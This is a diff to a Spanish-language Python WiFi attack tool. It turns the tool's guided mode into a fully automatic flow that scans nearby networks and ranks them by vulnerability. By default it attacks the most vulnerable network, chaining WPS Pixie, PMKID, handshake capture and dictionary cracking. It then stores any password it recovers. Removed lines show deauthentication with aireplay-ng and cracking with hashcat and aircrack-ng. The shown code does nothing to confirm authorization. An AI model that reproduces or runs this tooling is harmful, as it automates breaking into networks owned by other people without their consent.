@@ -468,18 +468,22 @@ def select_wordlist():
 # ─────────────────────────────────────────────────────────────────────────────
 
 def modo_wizard():
-    """[W] Modo Guiado: flujo completo para principiantes."""
+    """
+    [W] Modo Guiado — Flujo 100% automático:
+    Detecta adaptador → Monitor → Escanea → Puntúa vulnerabilidades
+    → Exploit Engine automático → Restaura red → Muestra resultado
+    """
     os.system("clear")
     banner()
-    separador("MODO GUIADO — PASO A PASO")
+    separador("MODO GUIADO — AUTOMATICO COMPLETO")
     print(f"""
-  {WHITE}Este modo te guía automáticamente por el proceso completo:{END}
-  {GREEN}  1.{END} Detecta tu adaptador WiFi
-  {GREEN}  2.{END} Activa el modo monitor (necesario para escanear)
-  {GREEN}  3.{END} Escanea las redes cercanas y las muestra en lista
-  {GREEN}  4.{END} Tú eliges la red objetivo
-  {GREEN}  5.{END} Captura el «handshake» (clave cifrada) automáticamente
-  {GREEN}  6.{END} Intenta descifrar la contraseña
+  {WHITE}Flujo totalmente automático:{END}
+  {GREEN}  1.{END} Detecta tu adaptador WiFi (TP-Link, Alfa, etc.)
+  {GREEN}  2.{END} Activa modo monitor automáticamente
+  {GREEN}  3.{END} Escanea todas las redes y puntúa vulnerabilidades
+  {GREEN}  4.{END} Tú eliges la red (o deja que ataque la más vulnerable)
+  {GREEN}  5.{END} Exploit Engine: WPS Pixie → PMKID → Handshake → Cracking
+  {GREEN}  6.{END} Muestra la clave si la encuentra
   {GREEN}  7.{END} Restaura tu red al terminar
     """)
 
@@ -487,131 +491,212 @@ def modo_wizard():
     if continuar.lower() != 's':
         return
 
-    # ── PASO 1: Interfaz ──────────────────────────────────────────────────────
+    # ── PASO 1: Detectar interfaz ─────────────────────────────────────────────
     step(1, "Detectando adaptador WiFi")
-    tip("Necesitas un adaptador compatible con modo monitor (ej: Alfa AWUS036ACH).")
-    interfaz = select_interface(auto=True)
+    interfaz = select_interface()
     if not interfaz:
-        error("No se detectó ninguna interfaz. Abortando.")
-        pause_back()
-        return
+        error("No se detectó ninguna interfaz. Conecta tu adaptador WiFi.")
+        pause_back(); return
 
-    # ── PASO 2: Modo monitor ──────────────────────────────────────────────────
+    # ── PASO 2: Activar monitor ───────────────────────────────────────────────
     step(2, "Activando modo monitor")
-    tip("El modo monitor permite capturar paquetes WiFi sin estar conectado.")
-    run("airmon-ng check kill")
+    tip("Compatible con TP-Link, Alfa, Ralink, Realtek, Atheros...")
     sp = Spinner("Activando modo monitor...")
     sp.start()
-    out = run(f"airmon-ng start {interfaz}", capture=True)
+    mon_iface = _enable_monitor(interfaz)
     sp.stop()
 
-    # Detectar nuevo nombre (wlan0 → wlan0mon)
-    mon_iface = re.search(r'monitor mode .*on (\w+)', out or "")
-    mon_iface = mon_iface.group(1) if mon_iface else interfaz + "mon"
-    if mon_iface not in get_interfaces():
-        mon_iface = next((i for i in get_interfaces() if "mon" in i), interfaz)
-    ok(f"Modo monitor activo en: {CYAN}{mon_iface}{END}")
+    # Verificar modo monitor
+    mode_check = run(f"iw dev {mon_iface} info 2>/dev/null | grep type", capture=True) or ""
+    if "monitor" not in mode_check:
+        error(f"No se pudo activar modo monitor en {mon_iface}.")
+        tip("Prueba: sudo modprobe -r rtl8812au && sudo modprobe rtl8812au")
+        tip("O instala el driver: sudo apt install realtek-rtl88xxau-dkms")
+        pause_back(); return
+    ok(f"Modo monitor activo: {CYAN}{mon_iface}{END}")
 
-    # ── PASO 3 + 4: Escanear y elegir objetivo ────────────────────────────────
-    step(3, "Escaneando redes cercanas")
-    bssid, channel, essid = select_target_from_scan(mon_iface)
-    if not bssid:
-        warn("No se seleccionó objetivo. Abortando.")
-        pause_back()
-        return
+    # ── PASO 3: Escanear y puntuar ────────────────────────────────────────────
+    step(3, "Escaneando redes y analizando vulnerabilidades")
+    t_scan = 20
+    redes = quick_scan(mon_iface, t_scan)
+    if not redes:
+        error("No se detectaron redes. ¿El adaptador está en modo monitor?")
+        run(f"airmon-ng stop {mon_iface} 2>/dev/null")
+        run("systemctl start NetworkManager 2>/dev/null")
+        pause_back(); return
 
-    # ── PASO 5: Captura handshake ─────────────────────────────────────────────
-    step(4, "Capturando handshake WPA2")
-    tip("El handshake ocurre cuando un dispositivo se conecta al router.")
-    tip("Enviaremos señales para forzar que un dispositivo se reconecte.")
-
-    os.makedirs("handshakes", exist_ok=True)
-    essid_safe = re.sub(r'[^\w\-]', '_', essid)
-    ruta = f"handshakes/{essid_safe}"
-
-    warn("Se abrirá una ventana de captura. NO la cierre hasta ver 'WPA handshake'.")
-    time.sleep(2)
-
-    cmd = (
-        f"xterm -title 'Captura - {essid}' -e "
-        f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {mon_iface}' & "
-        f"sleep 8 && "
-        f"aireplay-ng -0 15 -a {bssid} {mon_iface}"
-    )
-    run(cmd)
-    time.sleep(5)
-
-    sp = Spinner("Verificando handshake capturado...")
-    sp.start()
-    time.sleep(2)
-    ok_hs, cap_file = verify_handshake(ruta)
-    sp.stop()
-
-    if ok_hs:
-        ok(f"Handshake capturado: {cap_file}")
-    else:
-        warn(f"No se pudo verificar automáticamente. Archivo: {ruta}-01.cap")
-        warn("Puede ser válido de todas formas. Continuando...")
-        cap_file = ruta + "-01.cap"
-
-    # Intentar convertir a hc22000
-    hc_file = ruta + ".hc22000"
-    if check_tool("hcxpcapngtool") and os.path.exists(cap_file):
-        sp2 = Spinner("Convirtiendo para hashcat...")
+    # Verificar WPS
+    wps_raw = ""
+    if check_tool("wash"):
+        sp2 = Spinner("Verificando WPS en redes encontradas...")
         sp2.start()
-        run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null")
+        try:
+            wps_raw = subprocess.run(
+                f"timeout 10 wash -i {mon_iface} 2>/dev/null",
+                shell=True, capture_output=True, text=True).stdout
+        except Exception: pass
         sp2.stop()
 
-    # ── PASO 6: Crackeo ───────────────────────────────────────────────────────
-    step(5, "Intentando descifrar la contraseña")
-    diccionario = select_wordlist()
-    if not diccionario:
-        warn("Sin diccionario. Omitiendo crackeo.")
-    else:
-        info(f"Iniciando crackeo de: {CYAN}{essid}{END}")
-        tip("Este proceso puede tardar desde segundos hasta horas según el diccionario.")
+    # Puntuar y ordenar
+    scored = []
+    for r in redes:
+        sc, vv = _score_network(r, [wps_raw])
+        scored.append((sc, vv, r))
+    scored.sort(key=lambda x: x[0], reverse=True)
 
-        if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0 and check_tool("hashcat"):
-            info(f"Usando {GREEN}hashcat (GPU){END} — más rápido.")
-            best64 = next((p for p in [
-                "/usr/share/hashcat/rules/best64.rule",
-                "/usr/share/doc/hashcat/rules/best64.rule",
-            ] if os.path.exists(p)), "")
-            reglas_flag = f"-r {best64}" if best64 else ""
-            run(f"hashcat -m 22000 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=10")
-        else:
-            info(f"Usando {YELLOW}aircrack-ng (CPU){END}.")
-            run(f"aircrack-ng {cap_file} -w {diccionario}")
+    # Mostrar tabla de vulnerabilidades
+    separador("REDES ENCONTRADAS — ORDENADAS POR VULNERABILIDAD")
+    print(f"  {WHITE}{'#':<4} {'ESSID':<24} {'SEGURIDAD':<12} {'SCORE':<7} {'VECTOR'}{END}")
+    separador()
+    for i, (sc, vv, r) in enumerate(scored, 1):
+        col = RED if sc >= 80 else YELLOW if sc >= 50 else GREEN
+        print(f"  {WHITE}[{i:>2}]{END} {CYAN}{r['essid'][:22]:<24}{END} "
+              f"{YELLOW}{r['privacy'][:10]:<12}{END} "
+              f"{col}{sc:<7}{END} {DIM}{','.join(vv[:2])}{END}")
+    separador()
+
+    # ── PASO 4: Elegir objetivo ───────────────────────────────────────────────
+    step(4, "Selección de objetivo")
+    print(f"  {DIM}Escribe un número o presiona Enter para atacar la red más vulnerable ([1]){END}")
+    sel = ask("Número de red objetivo (Enter = más vulnerable)")
+    if sel == "" or sel == "1" or not sel.isdigit():
+        idx = 0
+    else:
+        idx = max(0, min(int(sel) - 1, len(scored) - 1))
+
+    sc_t, vv_t, red_t = scored[idx]
+    bssid   = red_t["bssid"]
+    channel = red_t["channel"]
+    essid   = red_t["essid"]
+
+    separador(f"OBJETIVO: {essid}")
+    info(f"BSSID: {bssid}  Canal: {channel}  Score: {sc_t}  Vectores: {', '.join(vv_t)}")
+
+    # Wordlist
+    wordlist = select_wordlist() or "/usr/share/wordlists/rockyou.txt"
+
+    # ── PASO 5: Exploit Engine ────────────────────────────────────────────────
+    step(5, "Lanzando Exploit Engine automático")
+    print(f"  {DIM}Ejecutando todos los vectores de ataque con progreso en tiempo real...{END}\n")
+
+    eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
+    clave, metodo = smart_exploit_target(eng)
+    print()
+
+    # ── PASO 6: Resultado ─────────────────────────────────────────────────────
+    separador("RESULTADO")
+    if clave:
+        ok(f"CLAVE ENCONTRADA: {GREEN}{clave}{END}")
+        ok(f"Metodo:           {WHITE}{metodo}{END}")
+        aid = db_log_attack("Wizard Auto", essid, bssid, channel, f"crackeada:{clave}")
+        db_log_password(aid, essid, bssid, clave, metodo)
+        print(f"\n  {WHITE}Guardado en historial. Usa [29] para verlo o [30] para reporte HTML.{END}")
+    else:
+        warn("No se encontró la clave con los vectores disponibles.")
+        tip("La red puede tener contraseña robusta. Prueba con un diccionario mayor.")
+        tip("Wordlists en: /usr/share/wordlists/ o https://github.com/danielmiessler/SecLists")
 
     # ── PASO 7: Restaurar red ─────────────────────────────────────────────────
     step(6, "Restaurando conexión de red")
     sp3 = Spinner("Desactivando modo monitor...")
     sp3.start()
-    run(f"airmon-ng stop {mon_iface}")
-    run("systemctl start NetworkManager 2>/dev/null || service networking restart 2>/dev/null")
+    run(f"airmon-ng stop {mon_iface} 2>/dev/null")
+    run(f"ip link set {mon_iface} down 2>/dev/null; iw dev {mon_iface} set type managed 2>/dev/null; ip link set {mon_iface} up 2>/dev/null")
+    run("systemctl start NetworkManager 2>/dev/null; service networking restart 2>/dev/null")
     sp3.stop()
-    ok("Red restaurada correctamente.")
+    ok("Red restaurada. Ya puedes navegar normalmente.")
 
-    separador("PROCESO COMPLETADO")
-    info(f"Archivos guardados en: {CYAN}handshakes/{END}")
-    pause_back()
+    separador("MODO GUIADO COMPLETADO")
+    gen = ask("¿Generar reporte HTML? (s/n)")
+    if gen.lower() == "s":
+        generate_report()
+    else:
+        pause_back()
 
 # ─────────────────────────────────────────────────────────────────────────────
 # INTERFAZ
 # ─────────────────────────────────────────────────────────────────────────────
 
+def _enable_monitor(interfaz: str) -> str:
+    """
+    Activa modo monitor con múltiples métodos (airmon-ng, iw, ip link).
+    Compatible con TP-Link, Alfa, Ralink, Realtek, etc.
+    Retorna el nombre de la interfaz en modo monitor.
+    """
+    # 1) Liberar bloqueos de rfkill (frecuente en TP-Link USB)
+    run("rfkill unblock all 2>/dev/null")
+    time.sleep(0.5)
+
+    # 2) Matar procesos que interfieren
+    run("airmon-ng check kill 2>/dev/null")
+    time.sleep(1)
+
+    # 3) Intentar con airmon-ng (método principal)
+    out = run(f"airmon-ng start {interfaz} 2>&1", capture=True) or ""
+
+    # Detectar nuevo nombre de la interfaz monitor
+    mon = None
+    m = re.search(r'monitor mode (?:enabled|vif enabled) (?:on|for) (\w+)', out, re.I)
+    if m:
+        mon = m.group(1)
+    if not mon:
+        m2 = re.search(r'\((\w+)\)', out)
+        if m2: mon = m2.group(1)
+
+    # Verificar que realmente existe en modo monitor
+    all_ifaces = get_interfaces()
+    if mon and mon in all_ifaces:
+        mode_chk = run(f"iw dev {mon} info 2>/dev/null | grep type", capture=True) or ""
+        if "monitor" in mode_chk:
+            return mon
+
+    # Buscar cualquier interfaz monitor existente
+    for iface in all_ifaces:
+        mode_chk = run(f"iw dev {iface} info 2>/dev/null | grep type", capture=True) or ""
+        if "monitor" in mode_chk:
+            return iface
+
+    # 4) Fallback: método manual con ip + iw (compatible TP-Link rtl8812au/rtl88x2bu)
+    warn("airmon-ng no creó interfaz monitor. Intentando método manual...")
+    run(f"ip link set {interfaz} down 2>/dev/null")
+    time.sleep(0.3)
+    run(f"iw dev {interfaz} set type monitor 2>/dev/null")
+    time.sleep(0.3)
+    run(f"ip link set {interfaz} up 2>/dev/null")
+    time.sleep(0.5)
+
+    mode_chk = run(f"iw dev {interfaz} info 2>/dev/null | grep type", capture=True) or ""
+    if "monitor" in mode_chk:
+        ok(f"Modo monitor manual activo en: {CYAN}{interfaz}{END}")
+        return interfaz
+
+    # 5) Último intento: iwconfig
+    run(f"ifconfig {interfaz} down 2>/dev/null")
+    run(f"iwconfig {interfaz} mode monitor 2>/dev/null")
+    run(f"ifconfig {interfaz} up 2>/dev/null")
+    time.sleep(0.5)
+    mode_chk = run(f"iwconfig {interfaz} 2>/dev/null", capture=True) or ""
+    if "Monitor" in mode_chk:
+        ok(f"Modo monitor (iwconfig) activo en: {CYAN}{interfaz}{END}")
+        return interfaz
+
+    error("No se pudo activar modo monitor.")
+    tip("Para TP-Link: instala el driver con 'sudo dkms install rtl8812au'")
+    tip("Luego ejecuta: sudo rmmod rtl8812au && sudo modprobe rtl8812au")
+    return interfaz
+
+
 def start_monitor():
-    """[1] Iniciar modo monitor."""
+    """[1] Iniciar modo monitor (compatible TP-Link, Alfa, Ralink, Realtek)."""
     separador("ACTIVAR MODO MONITOR")
-    tip("El modo monitor permite a tu adaptador capturar todo el tráfico WiFi cercano.")
+    tip("Permite capturar tráfico WiFi sin estar conectado a ninguna red.")
     interfaz = select_interface()
-    info("Cerrando procesos que interfieren con el modo monitor...")
-    run("airmon-ng check kill")
     sp = Spinner("Activando modo monitor...")
     sp.start()
-    run(f"airmon-ng start {interfaz}")
+    mon = _enable_monitor(interfaz)
     sp.stop()
-    ok(f"Modo monitor activo. Nueva interfaz: {interfaz}mon (verifique con opción 3)")
+    ok(f"Interfaz monitor: {CYAN}{mon}{END}")
+    run(f"iw dev {mon} info 2>/dev/null | grep -E 'type|addr'", capture=False)
     time.sleep(2)
 
 def stop_monitor():
